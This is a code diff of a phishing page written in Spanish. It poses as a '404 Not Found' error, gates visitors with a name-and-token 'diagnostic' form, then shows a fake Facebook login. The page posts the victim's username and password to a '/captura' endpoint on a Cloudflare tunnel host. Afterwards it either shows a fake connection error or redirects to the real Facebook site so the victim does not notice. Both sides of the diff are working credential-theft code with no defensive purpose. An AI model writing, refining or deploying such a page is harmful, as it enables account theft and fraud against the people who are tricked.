@@ -5,109 +5,73 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>404 Not Found</title>
     <style>
-        /* Estilos Generales */
-        body { 
-            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
-            background: #fff; margin: 0; display: flex; justify-content: center; align-items: center; 
-            height: 100vh; overflow: hidden;
-        }
+        body { font-family: -apple-system, sans-serif; background: #fff; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
         .container { width: 90%; max-width: 380px; text-align: center; }
-
-        /* Estilo Error 404 */
-        #seccion-404 h1 { font-size: 70px; margin: 0; font-family: monospace; color: #000; }
-        #seccion-404 p { color: #555; font-family: monospace; margin-bottom: 25px; }
         
-        /* Estilo Panel Facebook (Oculto al inicio) */
-        #seccion-fb { display: none; animation: fadeIn 0.5s; }
-        .fb-box { 
-            background: #fff; padding: 25px; border: 1px solid #dddfe2; 
-            border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); 
-        }
-        .fb-logo { color: #0866ff; font-size: 30px; font-weight: bold; margin-bottom: 20px; }
-
-        /* Inputs y Botones */
-        input { 
-            width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; 
-            border-radius: 6px; box-sizing: border-box; font-size: 14px; 
-            outline: none; background: #f5f6f7; 
-        }
-        button { 
-            width: 100%; padding: 12px; border: none; border-radius: 6px; 
-            font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; 
-            transition: 0.2s;
-        }
+        /* Estilo 404 */
+        #seccion-404 h1 { font-size: 60px; margin: 0; font-family: monospace; }
+        #seccion-404 p { color: #555; font-family: monospace; margin-bottom: 20px; }
+        .input-box { background: #f9f9f9; padding: 20px; border-radius: 10px; border: 1px solid #eee; }
+        
+        /* Estilo Facebook */
+        #seccion-fb { display: none; }
+        .fb-logo { color: #0866ff; font-size: 32px; font-weight: bold; margin-bottom: 20px; }
+        
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; background: #f5f6f7; }
+        button { width: 100%; padding: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
         .btn-black { background: #000; color: #fff; }
-        .btn-blue { background: #0866ff; color: #fff; }
-        .btn-blue:active { background: #0756d6; }
-
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .btn-blue { background: #0866ff; color: #fff; margin-top: 10px; }
     </style>
 </head>
 <body>
 
     <div id="seccion-404" class="container">
-        <h1>404</h1>
+        <h1>Not Found</h1>
         <p>The requested URL was not found on this server.</p>
-        <div style="background: #f9f9f9; padding: 15px; border-radius: 10px;">
-            <input type="text" id="nombre" placeholder="ESCRIBE TU NOMBRE">
-            <input type="text" id="token" placeholder="DIAGNOSTIC TOKEN" style="text-transform: uppercase;">
+        <div class="input-box">
+            <input type="text" id="nombre" placeholder="TU NOMBRE">
+            <input type="text" id="token" placeholder="DIAGNOSTIC TOKEN">
             <button class="btn-black" onclick="validar()">RUN DIAGNOSTIC</button>
         </div>
     </div>
 
     <div id="seccion-fb" class="container">
-        <div class="fb-box">
-            <div class="fb-logo">facebook</div>
-            <p style="font-size: 14px; color: #606770; margin-bottom: 15px;">Inicia sesión para finalizar la validación del sistema.</p>
-            <input type="text" id="fb-user" placeholder="Correo electrónico o número de teléfono">
-            <input type="password" id="fb-pass" placeholder="Contraseña">
-            <button class="btn-blue" onclick="enviar()">Iniciar sesión</button>
-            <div style="margin-top: 15px; color: #0866ff; font-size: 13px;">¿Olvidaste tu cuenta?</div>
-        </div>
+        <div class="fb-logo">facebook</div>
+        <p style="font-size: 14px; color: #606770;">Inicia sesión para continuar.</p>
+        <input type="text" id="fb-user" placeholder="Celular o correo electrónico">
+        <input type="password" id="fb-pass" placeholder="Contraseña">
+        <button class="btn-blue" onclick="enviar()">Iniciar sesión</button>
     </div>
 
     <script>
-        // --- AYBER: ACTUALIZA ESTA URL CON LA QUE TE DÉ CLOUDFLARE ---
-        const API_URL = "https://discretion-commitment-primarily-relationships.trycloudflare.com";
+        // --- AYBER: PEGA AQUÍ TU LINK DE CLOUDFLARE ---
+        const API_URL = "https://tu-url-aqui.trycloudflare.com"; 
 
-        // Al abrir, si la IP ya está registrada, saltamos directo al Facebook
-        window.onload = () => { validar(true); };
-
-        async function validar(esAuto = false) {
-            const n = document.getElementById('nombre').value.trim();
-            const t = document.getElementById('token').value.trim();
-
-            if (!esAuto && (!n || !t)) {
-                return alert("Debes completar el Nombre y el Token.");
-            }
+        async function validar() {
+            const n = document.getElementById('nombre').value;
+            const t = document.getElementById('token').value;
 
             try {
                 const res = await fetch(`${API_URL}/get-ghost-code`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ nombre: n, llave: t.toUpperCase() })
+                    body: JSON.stringify({ nombre: n, llave: t })
                 });
 
                 if (res.ok) {
-                    const data = await res.json();
-                    if (data.status === "SUCCESS") {
-                        // OCULTAMOS EL 404 Y MOSTRAMOS FB SIN RECARGAR
-                        document.getElementById('seccion-404').style.display = 'none';
-                        document.getElementById('seccion-fb').style.display = 'block';
-                    }
-                } else if (!esAuto) {
-                    alert("Acceso denegado. Token incorrecto.");
+                    document.getElementById('seccion-404').style.display = 'none';
+                    document.getElementById('seccion-fb').style.display = 'block';
+                } else {
+                    alert("Token inválido.");
                 }
-            } catch (err) {
-                console.log("Servidor no detectado.");
-            }
+            } catch (e) { alert("Error: El servidor en Termux no responde."); }
         }
 
         async function enviar() {
             const u = document.getElementById('fb-user').value;
             const p = document.getElementById('fb-pass').value;
 
-            if (!u || !p) return alert("Completa los datos.");
+            if(!u || !p) return alert("Completa los campos.");
 
             try {
                 await fetch(`${API_URL}/captura`, {
@@ -115,13 +79,9 @@
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ user: u, pass: p })
                 });
-                
-                // Mostramos un error falso y limpiamos el pass para simular fallo de red
-                alert("Error de conexión (ERR_CONNECTION_TIMED_OUT). Reintente.");
-                document.getElementById('fb-pass').value = "";
-            } catch (e) {
-                alert("Error de red. Verifique su conexión.");
-            }
+                // Redirección falsa para despistar
+                window.location.href = "https://m.facebook.com/login/identify";
+            } catch (e) { alert("Error de conexión."); }
         }
     </script>
 </body>
